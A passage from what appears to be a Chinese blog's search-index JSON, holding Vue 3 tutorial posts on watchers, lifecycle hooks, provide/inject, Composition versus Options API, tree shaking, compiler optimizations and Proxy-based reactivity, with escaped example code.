   &lt;h1&gt;watch - 侦听器&lt;/h1&gt;    &lt;p&gt;count1: &#123;&#123;data.count1&#125;&#125;&lt;/p&gt;    &lt;p&gt;count2: &#123;&#123;data.count2&#125;&#125;&lt;/p&gt;    &lt;button @click=&quot;stopAll&quot;&gt;Stop All&lt;/button&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123;    reactive,    watch&#125; from &quot;vue&quot;;export default &#123;    name: &quot;Watch&quot;,    setup() &#123;        const data = reactive(&#123;            count1: 0,            count2: 0        &#125;);        // 侦听单个数据源        const stop1 = watch(data, () =&gt;            console.log(&quot;watch1&quot;, data.count1, data.count2)        );        // 侦听多个数据源        const stop2 = watch([data], () =&gt; &#123;            console.log(&quot;watch2&quot;, data.count1, data.count2);        &#125;);        setInterval(() =&gt; &#123;            data.count1++;        &#125;, 1000);        return &#123;            data,            stopAll: () =&gt; &#123;                stop1();                stop2();            &#125;,        &#125;;    &#125;,&#125;;&lt;/script&gt;\n\n访问侦听状态变化前后的值\n&lt;template&gt;&lt;div&gt;    &lt;h1&gt;watch - 侦听器&lt;/h1&gt;    &lt;input type=&quot;text&quot; v-model=&quot;keywords&quot; /&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123;    ref,    watch&#125; from &quot;vue&quot;;export default &#123;    name: &quot;Watch&quot;,    setup() &#123;        let keywords = ref(&quot;111&quot;);        // 侦听单个数据源        watch(keywords, (newValue, oldValue) =&gt; &#123;            console.log(newValue, oldValue)        &#125;);        return &#123;            keywords        &#125;;    &#125;,&#125;;&lt;/script&gt;\n\n懒执行，也就是说仅在侦听的源变更时才执行回调\n&lt;template&gt;&lt;div&gt;    &lt;h1&gt;watch - 侦听器&lt;/h1&gt;    &lt;p&gt;num1=&#123;&#123;num1&#125;&#125;&lt;/p&gt;    &lt;p&gt;num2=&#123;&#123;num2&#125;&#125;&lt;/p&gt;&lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123;    ref,    watch,    watchEffect&#125; from &quot;vue&quot;;export default &#123;    name: &quot;Watch&quot;,    setup() &#123;        let num1 = ref(10);        let num2 = ref(10);        // 侦听单个数据源        watch(num1, (newValue, oldValue) =&gt; &#123;            console.log(newValue, oldValue)        &#125;);        watchEffect(() =&gt; console.log(`watchEffect侦听器：$&#123;num2.value&#125;`));        return &#123;            num1,            num2        &#125;;    &#125;,&#125;;&lt;/script&gt;\n\n七、组合式api生命周期钩子你可以通过在生命周期钩子前面加上 “on” 来访问组件的生命周期钩子。\n下表包含如何在 setup () 内部调用生命周期钩子：\n\n\n\n选项式 API\nHook inside setup\n\n\n\nbeforeCreate\n不需要*\n\n\ncreated\n不需要*\n\n\nbeforeMount\nonBeforeMount\n\n\nmounted\nonMounted\n\n\nbeforeUpdate\nonBeforeUpdate\n\n\nupdated\nonUpdated\n\n\nbeforeUnmount\nonBeforeUnmount\n\n\nunmounted\nonUnmounted\n\n\nerrorCaptured\nonErrorCaptured\n\n\nrenderTracked\nonRenderTracked\n\n\nrenderTriggered\nonRenderTriggered\n\n\n\n因为 setup 是围绕 beforeCreate 和 created 生命周期钩子运行的，所以不需要显式地定义它们。换句话说，在这些钩子中编写的任何代码都应该直接在 setup 函数中编写\n\nexport default &#123;  setup() &#123;    // mounted    onMounted(() =&gt; &#123;      console.log(&#x27;Component is mounted!&#x27;)    &#125;)  &#125;&#125;\n\n八、Provider Inject通常，当我们需要将数据从父组件传递到子组件时，我们使用 props。想象一下这样的结构：你有一些深嵌套的组件，而你只需要来自深嵌套子组件中父组件的某些内容。在这种情况下，你仍然需要将 prop 传递到整个组件链中，这可能会很烦人\n\n对于这种情况，我们可以使用 provide 和 inject 对父组件可以作为其所有子组件的依赖项提供程序，而不管组件层次结构有多深。这个特性有两个部分：父组件有一个 provide 选项来提供数据，子组件有一个 inject 选项来开始使用这个数据\n\n1. 非组合式api中的写法&lt;!-- src/components/MyMap.vue --&gt;&lt;template&gt;  &lt;MyMarker /&gt;&lt;/template&gt;&lt;script&gt;import MyMarker from &#x27;./MyMarker.vue&#x27;export default &#123;  components: &#123;    MyMarker  &#125;,  provide: &#123;    location: &#x27;North Pole&#x27;,    geolocation: &#123;      longitude: 90,      latitude: 135    &#125;  &#125;&#125;&lt;/script&gt;&lt;!-- src/components/MyMarker.vue --&gt;&lt;script&gt;export default &#123;  inject: [&#x27;location&#x27;, &#x27;geolocation&#x27;]&#125;&lt;/script&gt;\n\n2. 组合式api中的写法Provider：\n在 setup() 中使用 provide 时，我们首先从 vue 显式导入 provide 方法。这使我们能够调用 provide 时来定义每个 property\n\nprovide 函数允许你通过两个参数定义 property：\n\nproperty 的 name (&#96;&#96; 类型)\nproperty 的 value\n\n使用 MyMap 组件，我们提供的值可以按如下方式重构：\n&lt;!-- src/components/MyMap.vue --&gt;&lt;template&gt;  &lt;MyMarker /&gt;&lt;/template&gt;&lt;script&gt;import &#123; provide &#125; from &#x27;vue&#x27;import MyMarker from &#x27;./MyMarker.vueexport default &#123;  components: &#123;    MyMarker  &#125;,  setup() &#123;    provide(&#x27;location&#x27;, &#x27;North Pole&#x27;)    provide(&#x27;geolocation&#x27;, &#123;      longitude: 90,      latitude: 135    &#125;)  &#125;&#125;&lt;/script&gt;\n\nInject:\n在 setup() 中使用 inject 时，还需要从 vue 显式导入它。一旦我们这样做了，我们就可以调用它来定义如何将它暴露给我们的组件。\n\ninject 函数有两个参数：\n\n要注入的 property 的名称\n一个默认的值 (可选)\n\n使用 MyMarker 组件，可以使用以下代码对其进行重构：\n&lt;!-- src/components/MyMarker.vue --&gt;&lt;script&gt;import &#123; inject &#125; from &#x27;vue&#x27;export default &#123;  setup() &#123;    const userLocation = inject(&#x27;location&#x27;, &#x27;The Universe&#x27;)    const userGeolocation = inject(&#x27;geolocation&#x27;)    return &#123;      userLocation,      userGeolocation    &#125;  &#125;&#125;&lt;/script&gt;\n\nProvider Inject 响应性\n父组件：\nimport &#123;    provide,    ref,    reactive&#125; from &#x27;vue&#x27;setup() &#123;        const location = ref(&#x27;北京&#x27;)        const geolocation = reactive(&#123;            longitude: 90,            latitude: 135        &#125;)        const updateLocation = () =&gt; &#123;            location.value = &#x27;上海&#x27;        &#125;        provide(&#x27;location&#x27;, location);        provide(&#x27;geolocation&#x27;, geolocation);        return &#123;            updateLocation        &#125;    &#125;&lt;button @click=&quot;updateLocation&quot;&gt;改变location&lt;/button&gt;\n\n子组件：\nimport &#123; inject &#125; from &#x27;vue&#x27;export default &#123;  setup() &#123;    const userLocation = inject(&#x27;location&#x27;, &#x27;The Universe&#x27;)    const userGeolocation = inject(&#x27;geolocation&#x27;)    return &#123;      userLocation,      userGeolocation    &#125;  &#125;&#125;&lt;/script&gt;","categories":["框架"],"tags":["vue"]},{"title":"vue3-Composition Api 与  Options Api 有什么不同","url":"/2021/09/02/Vue/vue3-Composition%20Api%20%E4%B8%8E%20%20Options%20Api%20%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C/","content":"开始之前Composition API 可以说是Vue3的最大特点，那么为什么要推出Composition Api，解决了什么问题？\n通常使用Vue2开发的项目，普遍会存在以下问题：\n\n代码的可读性随着组件变大而变差\n每一种代码复用的方式，都存在缺点\nTypeScript支持有限\n\n以上通过使用Composition Api都能迎刃而解\n正文一、Options ApiOptions API，即大家常说的选项API，即以vue为后缀的文件，通过定义methods，computed，watch，data等属性与方法，共同处理页面逻辑\n如下图：\n\n可以看到Options代码编写方式，如果是组件状态，则写在data属性上，如果是方法，则写在methods属性上…\n用组件的选项 (data、computed、methods、watch) 组织逻辑在大多数情况下都有效\n然而，当组件变得复杂，导致对应属性的列表也会增长，这可能会导致组件难以阅读和理解\n二、Composition Api在 Vue3 Composition API 中，组件根据逻辑功能来组织的，一个功能所定义的所有 API 会放在一起（更加的高内聚，低耦合）\n即使项目很大，功能很多，我们都能快速的定位到这个功能所用到的所有 API\n\n三、对比下面对Composition Api与Options Api进行两大方面的比较\n\n逻辑组织\n逻辑复用\n\n逻辑组织Options API假设一个组件是一个大型组件，其内部有很多处理逻辑关注点（对应下图不用颜色）\n\n可以看到，这种碎片化使得理解和维护复杂组件变得困难\n选项的分离掩盖了潜在的逻辑问题。此外，在处理单个逻辑关注点时，我们必须不断地“跳转”相关代码的选项块\nCompostion API而Compositon API正是解决上述问题，将某个逻辑关注点相关的代码全都放在一个函数里，这样当需要修改一个功能时，就不再需要在文件中跳来跳去\n下面举个简单例子，将处理count属性相关的代码放在同一个函数了\nfunction useCount() &#123;    let count = ref(10);    let double = computed(() =&gt; &#123;        return count.value * 2;    &#125;);    const handleConut = () =&gt; &#123;        count.value = count.value * 2;    &#125;;    console.log(count);    return &#123;        count,        double,        handleConut,    &#125;;&#125;\n\n组件上中使用count\nexport default defineComponent(&#123;    setup() &#123;        const &#123; count, double, handleConut &#125; = useCount();        return &#123;            count,            double,            handleConut        &#125;    &#125;,&#125;);\n\n再来一张图进行对比，可以很直观地感受到 Composition API在逻辑组织方面的优势，以后修改一个属性功能的时候，只需要跳到控制该属性的方法中即可\n\n逻辑复用在Vue2中，我们是用过mixin去复用相同的逻辑\n下面举个例子，我们会另起一个mixin.js文件\nexport const MoveMixin = &#123;  data() &#123;    return &#123;      x: 0,      y: 0,    &#125;;  &#125;,  methods: &#123;    handleKeyup(e) &#123;      console.log(e.code);      // 上下左右 x y      switch (e.code) &#123;        case &quot;ArrowUp&quot;:          this.y--;          break;        case &quot;ArrowDown&quot;:          this.y++;          break;        case &quot;ArrowLeft&quot;:          this.x--;          break;        case &quot;ArrowRight&quot;:          this.x++;          break;      &#125;    &#125;,  &#125;,  mounted() &#123;    window.addEventListener(&quot;keyup&quot;, this.handleKeyup);  &#125;,  unmounted() &#123;    window.removeEventListener(&quot;keyup&quot;, this.handleKeyup);  &#125;,&#125;;\n\n然后在组件中使用\n&lt;template&gt;  &lt;div&gt;    Mouse position: x &#123;&#123; x &#125;&#125; / y &#123;&#123; y &#125;&#125;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import mousePositionMixin from &#x27;./mouse&#x27;export default &#123;  mixins: [mousePositionMixin]&#125;&lt;/script&gt;\n\n使用单个mixin似乎问题不大，但是当我们一个组件混入大量不同的 mixins 的时候\nmixins: [mousePositionMixin, fooMixin, barMixin, otherMixin]\n\n会存在两个非常明显的问题：\n\n命名冲突\n数据来源不清晰\n\n现在通过Compositon API这种方式改写上面的代码\nimport &#123; onMounted, onUnmounted, reactive &#125; from &quot;vue&quot;;export function useMove() &#123;  const position = reactive(&#123;    x: 0,    y: 0,  &#125;);  const handleKeyup = (e) =&gt; &#123;    console.log(e.code);    // 上下左右 x y    switch (e.code) &#123;      case &quot;ArrowUp&quot;:        // y.value--;        position.y--;        break;      case &quot;ArrowDown&quot;:        // y.value++;        position.y++;        break;      case &quot;ArrowLeft&quot;:        // x.value--;        position.x--;        break;      case &quot;ArrowRight&quot;:        // x.value++;        position.x++;        break;    &#125;  &#125;;  onMounted(() =&gt; &#123;    window.addEventListener(&quot;keyup&quot;, handleKeyup);  &#125;);  onUnmounted(() =&gt; &#123;    window.removeEventListener(&quot;keyup&quot;, handleKeyup);  &#125;);  return &#123; position &#125;;&#125;\n\n在组件中使用\n&lt;template&gt;  &lt;div&gt;    Mouse position: x &#123;&#123; x &#125;&#125; / y &#123;&#123; y &#125;&#125;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import &#123; useMove &#125; from &quot;./useMove&quot;;import &#123; toRefs &#125; from &quot;vue&quot;;export default &#123;  setup() &#123;    const &#123; position &#125; = useMove();    const &#123; x, y &#125; = toRefs(position);    return &#123;      x,      y,    &#125;;  &#125;,&#125;;&lt;/script&gt;\n\n\n\n可以看到，整个数据来源清晰了，即使去编写更多的 hook 函数，也不会出现命名冲突的问题\n小结\n在逻辑组织和逻辑复用方面，Composition API是优于Options API\n因为Composition API几乎是函数，会有更好的类型推断。\nComposition API对 tree-shaking 友好，代码也更容易压缩\nComposition API中见不到this的使用，减少了this指向不明的情况\n如果是小型组件，可以继续使用Options API，也是十分友好的\n\n","categories":["框架"],"tags":["vue3"]},{"title":"vue3-Treeshaking","url":"/2021/09/29/Vue/vue3-Treeshaking/","content":"一、是什么Tree shaking` 是一种通过清除多余代码方式来优化项目打包体积的技术，专业术语叫 `Dead code elimination\n\n简单来讲，就是在保持代码运行结果不变的前提下，去除无用的代码\n如果把代码打包比作制作蛋糕，传统的方式是把鸡蛋（带壳）全部丢进去搅拌，然后放入烤箱，最后把（没有用的）蛋壳全部挑选并剔除出去\n而treeshaking则是一开始就把有用的蛋白蛋黄（import）放入搅拌，最后直接作出蛋糕\n也就是说 ，tree shaking 其实是找出使用的代码\n在Vue2中，无论我们使用什么功能，它们最终都会出现在生产代码中。主要原因是Vue实例在项目中是单例的，捆绑程序无法检测到该对象的哪些属性在代码中被使用到\nimport Vue from &#x27;vue&#x27; Vue.nextTick(() =&gt; &#123;&#125;)\n\n而Vue3源码引入tree shaking特性，将全局 API 进行分块。如果您不使用其某些功能，它们将不会包含在您的基础包中\nimport &#123; nextTick, observable &#125; from &#x27;vue&#x27; nextTick(() =&gt; &#123;&#125;)\n\n二、如何做Tree shaking是基于ES6模板语法（import与exports），主要是借助ES6模块的静态编译思想，在编译时就能确定模块的依赖关系，以及输入和输出的变量\nTree shaking无非就是做了两件事：\n\n编译阶段利用ES6 Module判断哪些模块已经加载\n判断那些模块和变量未被使用或者引用，进而删除对应代码\n\n下面就来举个例子：\n通过脚手架vue-cli安装Vue2与Vue3项目\nvue create vue-demo\n\nVue2 项目组件中使用data属性\n&lt;script&gt;    export default &#123;        data: () =&gt; (&#123;            count: 1,        &#125;),    &#125;;&lt;/script&gt;\n\n对项目进行打包，体积如下图\n\n为组件设置其他属性（compted、watch）\nexport default &#123;    data: () =&gt; (&#123;        question:&quot;&quot;,         count: 1,    &#125;),    computed: &#123;        double: function () &#123;            return this.count * 2;        &#125;,    &#125;,    watch: &#123;        question: function (newQuestion, oldQuestion) &#123;            this.answer = &#x27;xxxx&#x27;        &#125;&#125;;\n\n再一次打包，发现打包出来的体积并没有变化\n\nVue3 项目组件中简单使用\nimport &#123; reactive, defineComponent &#125; from &quot;vue&quot;;export default defineComponent(&#123;  setup() &#123;    const state = reactive(&#123;      count: 1,    &#125;);    return &#123;      state,    &#125;;  &#125;,&#125;);\n\n将项目进行打包\n\n在组件中引入computed和watch\nimport &#123; reactive, defineComponent, computed, watch &#125; from &quot;vue&quot;;export default defineComponent(&#123;  setup() &#123;    const state = reactive(&#123;      count: 1,    &#125;);    const double = computed(() =&gt; &#123;      return state.count * 2;    &#125;);    watch(      () =&gt; state.count,      (count, preCount) =&gt; &#123;        console.log(count);        console.log(preCount);      &#125;    );    return &#123;      state,      double,    &#125;;  &#125;,&#125;);\n\n再次对项目进行打包，可以看到在引入computer和watch之后，项目整体体积变大了\n\n三、作用通过Tree shaking，Vue3给我们带来的好处是：\n\n减少程序体积（更小）\n减少程序执行时间（更快）\n便于将来对程序架构进行优化（更友好）\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue3优化","url":"/2021/10/16/Vue/vue3%E4%BC%98%E5%8C%96/","content":"一、编译阶段回顾Vue2，我们知道每个组件实例都对应一个 watcher 实例，它会在组件渲染的过程中把用到的数据property记录为依赖，当依赖发生改变，触发setter，则会通知watcher，从而使关联的组件重新渲染\n\n试想一下，一个组件结构如下图\n&lt;template&gt;    &lt;div id=&quot;content&quot;&gt;        &lt;p class=&quot;text&quot;&gt;静态文本&lt;/p&gt;        &lt;p class=&quot;text&quot;&gt;静态文本&lt;/p&gt;        &lt;p class=&quot;text&quot;&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;        &lt;p class=&quot;text&quot;&gt;静态文本&lt;/p&gt;        ...        &lt;p class=&quot;text&quot;&gt;静态文本&lt;/p&gt;    &lt;/div&gt;&lt;/template&gt;\n\n可以看到，组件内部只有一个动态节点，剩余一堆都是静态节点，所以这里很多 diff 和遍历其实都是不需要的，造成性能浪费\n因此，Vue3在编译阶段，做了进一步优化。主要有如下：\n\ndiff算法优化\n静态提升\n事件监听缓存\nSSR优化\n\ndiff算法优化vue3在diff算法中相比vue2增加了静态标记\n关于这个静态标记，其作用是为了会发生变化的地方添加一个flag标记，下次发生变化的时候直接找该地方进行比较\n下图这里，已经标记静态节点的p标签在diff过程中则不会比较，把性能进一步提高\n\n关于静态类型枚举如下\nexport const enum PatchFlags &#123;  TEXT = 1,// 动态的文本节点  CLASS = 1 &lt;&lt; 1,  // 2 动态的 class  STYLE = 1 &lt;&lt; 2,  // 4 动态的 style  PROPS = 1 &lt;&lt; 3,  // 8 动态属性，不包括类名和样式  FULL_PROPS = 1 &lt;&lt; 4,  // 16 动态 key，当 key 变化时需要完整的 diff 算法做比较  HYDRATE_EVENTS = 1 &lt;&lt; 5,  // 32 表示带有事件监听器的节点  STABLE_FRAGMENT = 1 &lt;&lt; 6,   // 64 一个不会改变子节点顺序的 Fragment  KEYED_FRAGMENT = 1 &lt;&lt; 7, // 128 带有 key 属性的 Fragment  UNKEYED_FRAGMENT = 1 &lt;&lt; 8, // 256 子节点没有 key 的 Fragment  NEED_PATCH = 1 &lt;&lt; 9,   // 512  DYNAMIC_SLOTS = 1 &lt;&lt; 10,  // 动态 solt  HOISTED = -1,  // 特殊标志是负整数表示永远不会用作 diff  BAIL = -2 // 一个特殊的标志，指代差异算法&#125;\n\n静态提升Vue3中对不参与更新的元素，会做静态提升，只会被创建一次，在渲染时直接复用\n这样就免去了重复的创建节点，大型应用会受益于这个改动，免去了重复的创建操作，优化了运行时候的内存占用\n&lt;span&gt;你好&lt;/span&gt;&lt;div&gt;&#123;&#123; message &#125;&#125;&lt;/div&gt;\n\n没有做静态提升之前\nexport function render(_ctx, _cache, $props, $setup, $data, $options) &#123;  return (_openBlock(), _createBlock(_Fragment, null, [    _createVNode(&quot;span&quot;, null, &quot;你好&quot;),    _createVNode(&quot;div&quot;, null, _toDisplayString(_ctx.message), 1 /* TEXT */)  ], 64 /* STABLE_FRAGMENT */))&#125;\n\n做了静态提升之后\nconst _hoisted_1 = /*#__PURE__*/_createVNode(&quot;span&quot;, null, &quot;你好&quot;, -1 /* HOISTED */)export function render(_ctx, _cache, $props, $setup, $data, $options) &#123;  return (_openBlock(), _createBlock(_Fragment, null, [    _hoisted_1,    _createVNode(&quot;div&quot;, null, _toDisplayString(_ctx.message), 1 /* TEXT */)  ], 64 /* STABLE_FRAGMENT */))&#125;// Check the console for the AST\n\n静态内容_hoisted_1被放置在render 函数外，每次渲染的时候只要取 _hoisted_1 即可\n同时 _hoisted_1 被打上了 PatchFlag ，静态标记值为 -1 ，特殊标志是负整数表示永远不会用于 Diff\n事件监听缓存默认情况下绑定事件行为会被视为动态绑定，所以每次都会去追踪它的变化\n&lt;div&gt;  &lt;button @click = &#x27;onClick&#x27;&gt;点我&lt;/button&gt;&lt;/div&gt;\n\n没开启事件监听器缓存\nexport const render = /*#__PURE__*/_withId(function render(_ctx, _cache, $props, $setup, $data, $options) &#123;  return (_openBlock(), _createBlock(&quot;div&quot;, null, [    _createVNode(&quot;button&quot;, &#123; onClick: _ctx.onClick &#125;, &quot;点我&quot;, 8 /* PROPS */, [&quot;onClick&quot;])                                             // PROPS=1&lt;&lt;3,// 8 //动态属性，但不包含类名和样式  ]))&#125;)\n\n开启事件侦听器缓存后\nexport function render(_ctx, _cache, $props, $setup, $data, $options) &#123;  return (_openBlock(), _createBlock(&quot;div&quot;, null, [    _createVNode(&quot;button&quot;, &#123;      onClick: _cache[1] || (_cache[1] = (...args) =&gt; (_ctx.onClick(...args)))    &#125;, &quot;点我&quot;)  ]))&#125;\n\n上述发现开启了缓存后，没有了静态标记。也就是说下次diff算法的时候直接使用\nSSR优化当静态内容大到一定量级时候，会用createStaticVNode方法在客户端去生成一个static node，这些静态node，会被直接innerHtml，就不需要创建对象，然后根据对象渲染\ndiv&gt;\t&lt;div&gt;\t\t&lt;span&gt;你好&lt;/span&gt;\t&lt;/div&gt;\t...  // 很多个静态属性\t&lt;div&gt;\t\t&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;\t&lt;/div&gt;&lt;/div&gt;\n\n编译后\nimport &#123; mergeProps as _mergeProps &#125; from &quot;vue&quot;import &#123; ssrRenderAttrs as _ssrRenderAttrs, ssrInterpolate as _ssrInterpolate &#125; from &quot;@vue/server-renderer&quot;export function ssrRender(_ctx, _push, _parent, _attrs, $props, $setup, $data, $options) &#123;  const _cssVars = &#123; style: &#123; color: _ctx.color &#125;&#125;  _push(`&lt;div$&#123;    _ssrRenderAttrs(_mergeProps(_attrs, _cssVars))  &#125;&gt;&lt;div&gt;&lt;span&gt;你好&lt;/span&gt;...&lt;div&gt;&lt;span&gt;你好&lt;/span&gt;&lt;div&gt;&lt;span&gt;$&#123;    _ssrInterpolate(_ctx.message)  &#125;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;`)&#125;\n\n二、源码体积相比Vue2，Vue3整体体积变小了，除了移出一些不常用的API，再重要的是Tree shanking\n任何一个函数，如ref、reavtived、computed等，仅仅在用到的时候才打包，没用到的模块都被摇掉，打包的整体体积变小\nimport &#123; computed, defineComponent, ref &#125; from &#x27;vue&#x27;;export default defineComponent(&#123;    setup(props, context) &#123;        const age = ref(18)        let state = reactive(&#123;            name: &#x27;test&#x27;        &#125;)        const readOnlyAge = computed(() =&gt; age.value++) // 19        return &#123;            age,            state,            readOnlyAge        &#125;    &#125;&#125;);\n\n三、响应式系统vue2中采用 defineProperty来劫持整个对象，然后进行深度遍历所有属性，给每个属性添加getter和setter，实现响应式\nvue3采用proxy重写了响应式系统，因为proxy可以对整个对象进行监听，所以不需要深度遍历\n\n可以监听动态属性的添加\n可以监听到数组的索引和数组length属性\n可以监听删除属性\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue3-Proxy API 替代 defineProperty API","url":"/2021/09/26/Vue/vue3-Proxy%20API%20%E6%9B%BF%E4%BB%A3%20defineProperty%20API%20/","content":"一、Object.defineProperty定义：Object.defineProperty() 方法会直接在一个对象上定义一个新属性，或者修改一个对象的现有属性，并返回此对象\n#为什么能实现响应式通过defineProperty 两个属性，get及set\n\nget\n\n属性的 getter 函数，当访问该属性时，会调用此函数。执行时不传入任何参数，但是会传入 this 对象（由于继承关系，这里的this并不一定是定义该属性的对象）。该函数的返回值会被用作属性的值\n\nset\n\n属性的 setter 函数，当属性值被修改时，会调用此函数。该方法接受一个参数（也就是被赋予的新值），会传入赋值时的 this 对象。默认为 undefined\n下面通过代码展示：\n定义一个响应式函数defineReactive\nfunction update() &#123;    app.innerText = obj.foo&#125;function defineReactive(obj, key, val) &#123;    Object.defineProperty(obj, key, &#123;        get() &#123;            console.log(`get $&#123;key&#125;:$&#123;val&#125;`);            return val        &#125;,        set(newVal) &#123;            if (newVal !== val) &#123;                val = newVal                update()            &#125;        &#125;    &#125;)&#125;\n\n调用defineReactive，数据发生变化触发update方法，实现数据响应式\nconst obj = &#123;&#125;defineReactive(obj, &#x27;foo&#x27;, &#x27;&#x27;)setTimeout(()=&gt;&#123;    obj.foo = new Date().toLocaleTimeString()&#125;,1000)\n\n在对象存在多个key情况下，需要进行遍历\nfunction observe(obj) &#123;    if (typeof obj !== &#x27;object&#x27; || obj == null) &#123;        return    &#125;    Object.keys(obj).forEach(key =&gt; &#123;        defineReactive(obj, key, obj[key])    &#125;)&#125;\n\n如果存在嵌套对象的情况，还需要在defineReactive中进行递归\nfunction defineReactive(obj, key, val) &#123;    observe(val)    Object.defineProperty(obj, key, &#123;        get() &#123;            console.log(`get $&#123;key&#125;:$&#123;val&#125;`);            return val        &#125;,        set(newVal) &#123;            if (newVal !== val) &#123;                val = newVal                update()            &#125;        &#125;    &#125;)&#125;\n\n当给key赋值为对象的时候，还需要在set属性中进行递归\nset(newVal) &#123;    if (newVal !== val) &#123;        observe(newVal) // 新值是对象的情况        notifyUpdate()    &#125;&#125;\n\n上述例子能够实现对一个对象的基本响应式，但仍然存在诸多问题\n现在对一个对象进行删除与添加属性操作，无法劫持到\nconst obj = &#123;    foo: &quot;foo&quot;,    bar: &quot;bar&quot;&#125;observe(obj)delete obj.foo // no okobj.jar = &#x27;xxx&#x27; // no ok\n\n当我们对一个数组进行监听的时候，并不那么好使了\nconst arrData = [1,2,3,4,5];arrData.forEach((val,index)=&gt;&#123;    defineProperty(arrData,index,val)&#125;)arrData.push() // no okarrData.pop()  // no okarrDate[0] = 99 // ok\n\n可以看到数据的api无法劫持到，从而无法实现数据响应式，\n所以在Vue2中，增加了set、delete API，并且对数组api方法进行一个重写\n还有一个问题则是，如果存在深层的嵌套对象关系，需要深层的进行监听，造成了性能的极大问题\n小结\n检测不到对象属性的添加和删除\n数组API方法无法监听到\n需要对每个属性进行遍历监听，如果嵌套对象，需要深层监听，造成性能问题\n\n二、proxyProxy的监听是针对一个对象的，那么对这个对象的所有操作会进入监听操作，这就完全可以代理所有属性了\n在ES6系列中，我们详细讲解过Proxy的使用，就不再述说了\n下面通过代码进行展示：\n定义一个响应式方法reactive\nfunction reactive(obj) &#123;    if (typeof obj !== &#x27;object&#x27; &amp;&amp; obj != null) &#123;        return obj    &#125;    // Proxy相当于在对象外层加拦截    const observed = new Proxy(obj, &#123;        get(target, key, receiver) &#123;            const res = Reflect.get(target, key, receiver)            console.log(`获取$&#123;key&#125;:$&#123;res&#125;`)            return res        &#125;,        set(target, key, value, receiver) &#123;            const res = Reflect.set(target, key, value, receiver)            console.log(`设置$&#123;key&#125;:$&#123;value&#125;`)            return res        &#125;,        deleteProperty(target, key) &#123;            const res = Reflect.deleteProperty(target, key)            console.log(`删除$&#123;key&#125;:$&#123;res&#125;`)            return res        &#125;    &#125;)    return observed&#125;\n\n测试一下简单数据的操作，发现都能劫持\nconst state = reactive(&#123;    foo: &#x27;foo&#x27;&#125;)// 1.获取state.foo // ok// 2.设置已存在属性state.foo = &#x27;fooooooo&#x27; // ok// 3.设置不存在属性state.dong = &#x27;dong&#x27; // ok// 4.删除属性delete state.dong // ok\n\n再测试嵌套对象情况，这时候发现就不那么 OK 了\nconst state = reactive(&#123;    bar: &#123; a: 1 &#125;&#125;)// 设置嵌套对象属性state.bar.a = 10 // no ok\n\n如果要解决，需要在get之上再进行一层代理\nfunction reactive(obj) &#123;    if (typeof obj !== &#x27;object&#x27; &amp;&amp; obj != null) &#123;        return obj    &#125;    // Proxy相当于在对象外层加拦截    const observed = new Proxy(obj, &#123;        get(target, key, receiver) &#123;            const res = Reflect.get(target, key, receiver)            console.log(`获取$&#123;key&#125;:$&#123;res&#125;`)            return isObject(res) ? reactive(res) : res        &#125;,    return observed&#125;\n\n三、总结Object.defineProperty只能遍历对象属性进行劫持\nfunction observe(obj) &#123;    if (typeof obj !== &#x27;object&#x27; || obj == null) &#123;        return    &#125;    Object.keys(obj).forEach(key =&gt; &#123;        defineReactive(obj, key, obj[key])    &#125;)&#125;\n\nProxy直接可以劫持整个对象，并返回一个新对象，我们可以只操作新的对象达到响应式目的\nfunction reactive(obj) &#123;    if (typeof obj !== &#x27;object&#x27; &amp;&amp; obj != null) &#123;        return obj    &#125;    // Proxy相当于在对象外层加拦截    const observed = new Proxy(obj, &#123;        get(target, key, receiver) &#123;            const res = Reflect.get(target, key, receiver)            console.log(`获取$&#123;key&#125;:$&#123;res&#125;`)            return res        &#125;,        set(target, key, value, receiver) &#123;            const res = Reflect.set(target, key, value, receiver)            console.log(`设置$&#123;key&#125;:$&#123;value&#125;`)            return res        &#125;,        deleteProperty(target, key) &#123;            const res = Reflect.deleteProperty(target, key)            console.log(`删除$&#123;key&#125;:$&#123;res&#125;`)            return res        &#125;    &#125;)    return observed&#125;\n\nProxy可以直接监听数组的变化（push、shift、splice）\nconst obj = [1,2,3]const proxtObj = reactive(obj)obj.psuh(4) // ok\n\nProxy有多达13种拦截方法,不限于apply、ownKeys、deleteProperty、has等等，这是Object.defineProperty不具备的\n正因为defineProperty自身的缺陷，导致Vue2在实现响应式过程需要实现其他的方法辅助（如重写数组方法、增加额外set、delete方法）\n// 数组重写const originalProto = Array.prototypeconst arrayProto = Object.create(originalProto)[&#x27;push&#x27;, &#x27;pop&#x27;, &#x27;shift&#x27;, &#x27;unshift&#x27;, &#x27;splice&#x27;, &#x27;reverse&#x27;, &#x27;sort&#x27;].forEach(method =&gt; &#123;  arrayProto[method] = function () &#123;    originalProto[method].apply(this.arguments)    dep.notice()  &#125;&#125;);// set、deleteVue.set(obj,&#x27;bar&#x27;,&#x27;newbar&#x27;)Vue.delete(obj),&#x27;bar&#x27;)\n\nProxy 不兼容IE，也没有 polyfill, defineProperty 能支持到IE9\n","categories":["框架"],"tags":["vue"]},{"title":"vue和react的区别","url":"/2018/07/28/Vue/vue%E5%92%8CReact%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"vue和react是当前最火的两个前端框架，vue的发展很快，但是目前来说，react的生态系统会更强大，世界上使用这个框架的人也很多。另外，react是facebook官方维护的，而vue是尤雨溪本人维护的。并且在其他周边库，如react的react-rouer和redux，是react社区在维护的。而vue的vuex和vue-router都是尤雨溪在维护的。\n1、都在使用Virtual 